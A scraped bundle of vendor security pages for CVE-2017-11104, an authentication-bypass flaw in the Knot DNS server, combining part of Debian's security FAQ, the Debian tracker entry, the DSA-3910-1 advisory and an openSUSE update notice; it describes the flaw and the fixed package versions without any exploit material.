policy?](#disclosure-policy)- [Our vulnerability management tool has shown that the following issues are open (list of CVEs with random CVSS scores). When are those going to be fixed?](#cve-severity-assessment)- [What does local (remote) mean?](#localremote)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

---

Back to the [Debian Project homepage](../).

---

This page is also available in the following languages:
Select your language
dansk
Deutsch
español
français
Italiano
Nederlands
polski
Português
suomi
svenska
Русский (Russkij)
中文(简)
中文(HK)
中文(繁)
日本語 (Nihongo)

How to set [the default document language](../intro/cn)

---

**[Home](/)**

* [About](../intro/about)
  + [Social Contract](../social_contract)
  + [Code of Conduct](../code_of_conduct)
  + [Free Software](../intro/free)
  + [Legal Info](../legal)
* [Help Debian](../intro/help)

* [Getting Debian](../distrib/)
  + [Network install](../distrib/netinst)
  + [CD/USB ISO images](../CD/)
  + [Pure Blends](../blends/)
  + [Debian Packages](../distrib/packages)
  + [Developers' Corner](../devel/)

* [News](../News/)
  + [Project News](../News/weekly/)
  + [Events](../events/)
* [Documentation](../doc/)
  + [Release Info](../releases/)
  + [Debian Wiki](https://wiki.debian.org/)

* [Support](../support)
  + [Debian International](../international/)
  + [Security Information](../security/)
  + [Bug reports](../Bugs/)
  + [Mailing Lists](../MailingLists/)

* [Site map](../sitemap)
* [Search](https://search.debian.org/)
* [The Debian Blog](https://bits.debian.org)
* [Debian Micronews](https://micronews.debian.org)
* [Debian Planet](https://planet.debian.org)

See our [contact page](../contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Fri, Oct 6 21:55:11 UTC 2023

Last Built: Sat, Jan 11 19:35:55 UTC 2025

Copyright © 1997-2023 [SPI](https://www.spi-inc.org/) and others; See [license terms](../license)

Debian is a registered [trademark](../trademark) of Software in the Public Interest, Inc.



=== Content from security-tracker.debian.org_995a868e_20250126_062839.html ===

# CVE-2017-11104

| **Name** | CVE-2017-11104 |
| --- | --- |
| **Description** | Knot DNS before 2.4.5 and 2.5.x before 2.5.2 contains a flaw within the TSIG protocol implementation that would allow an attacker with a valid key name and algorithm to bypass TSIG authentication if no additional ACL restrictions are set, because of an improper TSIG validity period check. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2017-11104) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-11104); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2017-11104), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2017-11104), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2017-11104), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2017-11104), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-11104), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2017-11104), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2017-11104), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2017-11104)/[CVE](https://www.suse.com/security/cve/CVE-2017-11104/), GitHub [advisories](https://github.com/advisories?query=CVE-2017-11104)/[code](https://github.com/search?type=Code&q=%22CVE-2017-11104%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2017-11104%22), [web search](https://duckduckgo.com/html?q=%22CVE-2017-11104%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **References** | [DSA-3910-1](/tracker/DSA-3910-1) |
| **Debian Bugs** | [865678](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=865678) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [knot](/tracker/source-package/knot) ([PTS](https://tracker.debian.org/pkg/knot)) | bullseye | 3.0.5-1+deb11u1 | fixed |
|  | bookworm | 3.2.6-1 | fixed |
|  | trixie | 3.4.3-1 | fixed |
|  | sid | 3.4.4-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [knot](/tracker/source-package/knot) | source | jessie | 1.6.0-1+deb8u1 |  | [DSA-3910-1](/tracker/DSA-3910-1) |  |
| [knot](/tracker/source-package/knot) | source | stretch | 2.4.0-3+deb9u1 |  | [DSA-3910-1](/tracker/DSA-3910-1) |  |
| [knot](/tracker/source-package/knot) | source | (unstable) | 2.5.3-1 |  |  | [865678](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=865678) |

## Notes

```
<https://lists.nic.cz/pipermail/knot-dns-users/2017-June/001144.html>
<http://www.synacktiv.ninja/ressources/Knot_DNS_TSIG_Signature_Forgery.pdf>

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from www.debian.org_2c1e1a6d_20250125_055257.html ===


---

[[Date Prev](msg00171.html)][[Date Next](msg00173.html)]
[[Thread Prev](msg00171.html)][[Thread Next](msg00173.html)]
[[Date Index](maillist.html#00172)]
[[Thread Index](threads.html#00172)]

# [SECURITY] [DSA 3910-1] knot security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 3910-1] knot security update
* *From*: Yves-Alexis Perez <corsac@debian.org>
* *Date*: Fri, 14 Jul 2017 21:34:51 +0200
* *Message-id*: <[[🔎]](/msgid-search/59691cdb.a0032.627c5db3%40scapa.corsac.net) [59691cdb.a0032.627c5db3@scapa.corsac.net](msg00172.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-3910-1                   security@debian.org
<https://www.debian.org/security/>                        Yves-Alexis Perez
July 14, 2017                         <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : knot
CVE ID         : CVE-2017-11104
Debian Bug     : 865678

ClÃ©ment Berthaux from Synaktiv discovered a signature forgery vulnerability in
knot, an authoritative-only DNS server. This vulnerability allows an attacker
to bypass TSIG authentication by sending crafted DNS packets to a server.

For the oldstable distribution (jessie), this problem has been fixed
in version 1.6.0-1+deb8u1.

For the stable distribution (stretch), this problem has been fixed in
version 2.4.0-3+deb9u1.

For the testing (buster) and unstable (sid), this problem will be fixed
in a later update.

We recommend that you upgrade your knot packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEl0WwInMjgf6efq/1bdtT8qZ1wKUFAllpF4IACgkQbdtT8qZ1
wKXLNAgApLZt8aZMFy2KgjAJUh439M6i3UjxJ/Hm/iSFhc0we+JM69RfT6juAc1h
AMVlFh4Ifc+G7QpfBSZJzSS8ihpP5FxUmG9Lcad9OT2mVrHLIaT7ZLLElQEQsK2u
/wSNF86CLSSfffLSYObFLZl9JGMZVSJUvIu3K/s6vbnf0lfAJ+vn6UQv+SR4VdgM
Wlnl+LTEnqy03XMpAuW49IMAXKYpwjngCbBS+l/YjzPDE6NoHAffs9MmGWLtZxdp
e1okJX5vhWQFdslhy5PKz2m9QHSfe72/g+mx9aPtWYwr2KuaqlpwkwB4GQ5gmMvg
IwWF4TVLIquKjxo9IdqqxWxe8jhdvQ==
=lkd8
-----END PGP SIGNATURE-----

```

---



=== Content from lists.opensuse.org_faa3d687_20250125_055257.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/#F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA)

# [security-announce] openSUSE-SU-2020:1232-1: moderate: Security update for knot

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

18 Sep
2020

18 Sep
'20

16:41

openSUSE Security Update: Security update for knot
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2020:1232-1
Rating: moderate
References: #1047841
Cross-References: CVE-2017-11104
Affected Products:
openSUSE Backports SLE-15-SP2
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
This update for knot fixes the following issues:
- CVE-2017-11104: Fixed an improper implementation of TSIG protocol which
could have allowed an attacker with a valid key name and algorithm to
bypass TSIG authentication (boo#1047841).
This update was imported from the openSUSE:Leap:15.2:Update update project.
Patch Instructions:
To install this openSUSE Security Update use the SUSE recommended installation methods
like YaST online\_update or "zypper patch".
Alternatively you can run the command listed for your product:
- openSUSE Backports SLE-15-SP2:
zypper in -t patch openSUSE-2020-1232=1
Package List:
- openSUSE Backports SLE-15-SP2 (aarch64 ppc64le s390x x86\_64):
knot-1.6.8-bp152.4.3.1
References:
<https://www.suse.com/security/cve/CVE-2017-11104.html>
<https://bugzilla.suse.com/1047841>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/#F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from www.suse.com_60909b94_20250126_062845.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2017-11104.html)
[English](https://www.suse.com/security/cve/CVE-2017-11104.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2017-11104.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2017-11104.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2017-11104.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2017-11104.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2017-11104.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2017-11104.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
